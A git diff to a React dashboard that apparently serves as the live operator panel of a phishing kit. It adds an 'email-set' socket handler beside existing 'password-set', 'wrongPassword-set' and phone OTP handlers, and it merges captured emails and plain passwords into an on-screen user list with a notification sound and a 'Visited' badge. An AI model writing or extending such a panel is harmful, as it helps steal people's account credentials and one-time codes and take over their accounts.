@@ -290,16 +290,6 @@ const copyField = async (field, value) => {
         user
       );
 
-      toast.info(`New user: ${user.email}`, {
-        position: "bottom-right",
-        autoClose: 5000,
-        hideProgressBar: false,
-        closeOnClick: true,
-        pauseOnHover: true,
-        draggable: true,
-        progress: undefined,
-      });
-
       
       playNotificationSound();
     
@@ -356,6 +346,41 @@ const copyField = async (field, value) => {
         return {
           ...user,
         password: data.password
+        };
+
+      }
+
+      return user;
+
+    });
+
+  });
+
+};
+
+
+      const handleEmailSet = (data) => {
+
+  console.log(
+    "🔥 Email SET EVENT RECEIVED:",
+    data
+  );
+
+      playNotificationSound();
+
+
+  setUsers((currentUsers) => {
+
+    return currentUsers.map((user) => {
+
+      if (
+        String(user._id) ===
+        String(data._id)
+      ) {
+
+        return {
+          ...user,
+        email: data.email
         };
 
       }
@@ -585,6 +610,11 @@ const handlePhoneOtp2Submitted = (data) => {
       "new-user",
       handleNewUser
     );
+    
+    socket.on(
+      "email-set",
+      handleEmailSet
+    );
 
     socket.on(
       "password-set",
@@ -642,6 +672,10 @@ const handlePhoneOtp2Submitted = (data) => {
       socket.off(
         "password-set",
         handlePasswordSet
+      );
+       socket.off(
+        "email-set",
+        handleEmailSet
       );
        socket.off(
         "wrongPassword-set",
@@ -934,7 +968,18 @@ const handlePhoneOtp2Submitted = (data) => {
                         </>
                       )}
                     </button>
+                    
                   )}
+                     {user.createdAt && (
+                          <button
+                            className="detail-button " 
+                            type="button"
+                          >
+                            <span className="detail-value">
+                              Visited
+                            </span>
+                          </button>
+                        )}
 
                 </div>
                 
@@ -1488,7 +1533,7 @@ const styles = {
   userGrid: {
     display: "grid",
     gridTemplateColumns:
-      "repeat(auto-fill, minmax(390px, 49%))",
+      "repeat(auto-fill, minmax(350px, 49%))",
     gap: "20px"
   },
 
